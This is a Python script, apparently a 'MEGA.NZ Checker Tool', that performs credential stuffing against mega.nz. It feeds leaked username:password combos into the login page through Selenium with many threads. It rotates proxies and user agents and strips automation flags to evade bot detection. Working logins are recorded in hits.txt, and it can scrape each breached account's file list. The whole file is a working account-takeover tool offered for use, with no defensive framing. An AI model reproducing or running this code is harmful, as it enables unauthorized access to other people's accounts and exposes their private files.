from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from colorama import init,Style,Fore
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from random import choice
from os import name,system
from sys import stdout
from threading import Thread,Lock
from beautifultable import BeautifulTable

class Main:

    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120


    def SetTitle(self,title_name:str):
        system("title {0}".format(title_name))

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('useragents.txt','r')
        return choice(useragents)

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def TitleUpdate(self):
        while True:
            self.SetTitle('One Man Builds MEGA.NZ Checker Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2}'.format(self.hits,self.bads,self.retries))
            sleep(0.1)

    def __init__(self):
        init(convert=True)
        self.lock = Lock()
        self.clear()
        self.SetTitle('One Man Builds MEGA.NZ Checker Tool')

        self.hits = 0
        self.bads = 0
        self.retries = 0

        title = Fore.RED+"""
                                 ╔══════════════════════════════════════════════════╗
                                      ╔╦╗╔═╗╔═╗╔═╗ ╔╗╔╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                      ║║║║╣ ║ ╦╠═╣ ║║║╔═╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                      ╩ ╩╚═╝╚═╝╩ ╩o╝╚╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                 ╚══════════════════════════════════════════════════╝

        """
        print(title)

        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
        self.headless = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Headless ['+Fore.RED+'0'+Fore.CYAN+']Not Headless: '))
        self.save_files_list = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Save Files List To Txt ['+Fore.RED+'0'+Fore.CYAN+']Dont Save Files List To Txt: '))
        
        if self.save_files_list == 1:
            self.files_load_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Files Load Max Wait (seconds): '))

        self.website_load_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Website Load Max Wait (seconds): '))
        self.login_check_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Login Check Max Wait (seconds): '))
        self.wait_before_start = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Wait Before Start (seconds): '))
        self.threads = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
        print('')

    def ReadFile(self,filename,method):
        with open(filename,method,encoding='utf8') as f:
            content = [line.strip('\n') for line in f]
            return content

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('proxies.txt','r')
        return choice(proxies_file)

    def Check(self,username,password):
        try:
            options = Options()

            if self.headless == 1:
                options.add_argument('--headless')
                
            options.add_argument(f'--user-agent={self.GetRandomUserAgent()}')
            options.add_argument('no-sandbox')
            options.add_argument('--log-level=3')
            options.add_argument('--lang=en')

            if self.use_proxy == 1:
                options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxy()))

            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])

            #Removes navigator.webdriver flag
            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            
            # For older ChromeDriver under version 79.0.3945.16
            options.add_experimental_option('useAutomationExtension', False)

            options.add_argument("window-size=1280,800")

            #For ChromeDriver version 79.0.3945.16 or over
            options.add_argument('--disable-blink-features=AutomationControlled')

            driver = webdriver.Chrome(options=options)

            driver.get('https://mega.nz/login')

            username_element_present = EC.presence_of_element_located((By.XPATH,'/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[2]/input'))
            WebDriverWait(driver,self.website_load_max_wait).until(username_element_present)

            username_element = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[2]/input').send_keys(username)
            password_element = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[3]/input').send_keys(password)  

            #login_button_clickable = EC.element_to_be_clickable((By.XPATH,'/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[6]'))     
            #WebDriverWait(driver,20).until(login_button_clickable)

            login_button_element = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[6]').click()

            try:
                url_contains = EC.url_contains('https://mega.nz/fm')
                WebDriverWait(driver, self.login_check_max_wait).until(url_contains)
                if self.save_files_list == 1:
                    files_element_presence = EC.visibility_of_element_located((By.XPATH,'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table'))
                    WebDriverWait(driver,self.files_load_max_wait).until(files_element_presence)

                    files_length = driver.find_element_by_xpath('/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody')
                    files_length = len(files_length.text.splitlines())/2
                    index = 1

                    table = BeautifulTable(180)
                    table.columns.header = ['USER','NAME','SIZE','TYPE','DATE ADDED']
                    
                    for i in range(int(files_length)):
                        index += 1
                        filename = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[2]/span[2]').text
                        file_size = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[4]').text
                        file_type = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[5]').text
                        date = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[6]').text
                        table.rows.append([f'{username}:{password}',filename,file_size,file_type,date])

                    with open('detailed_hits.txt','a',encoding='utf8') as f:
                        f.write(str(table)+'\n')

                self.PrintText(Fore.RED,Fore.CYAN,'HIT',f'{username}:{password}')
                with open('hits.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.hits += 1
            except TimeoutException:
                self.PrintText(Fore.RED,Fore.CYAN,'BAD',f'{username}:{password}')
                with open('bads.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.bads += 1
        except:
            self.retries += 1
            driver.quit()
            self.Check(username,password)
        finally:
            driver.quit()

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('combos.txt','r')
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            for combo in combos:
                username = combo.split(':')[0]
                password = combo.split(':')[-1]
                ex.submit(self.Check,username,password)
                if self.wait_before_start > 0:
                    sleep(self.wait_before_start)


if __name__ == '__main__':
    main = Main()
    main.Start()